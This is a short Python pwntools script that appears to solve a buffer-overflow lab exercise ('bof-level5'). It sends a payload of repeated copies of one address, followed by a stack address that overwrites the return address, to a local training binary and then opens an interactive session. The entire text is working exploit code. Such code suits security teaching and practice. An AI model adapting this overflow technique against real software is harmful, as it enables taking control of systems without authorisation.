#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level5/bof-level5')

buffer = p32(0x080484cb)
for i in range(0,(124/4)):
	buffer += p32(0x080484cb)
buffer += p32 (0xffffc4c0)


p.sendline(buffer)
p.interactive()
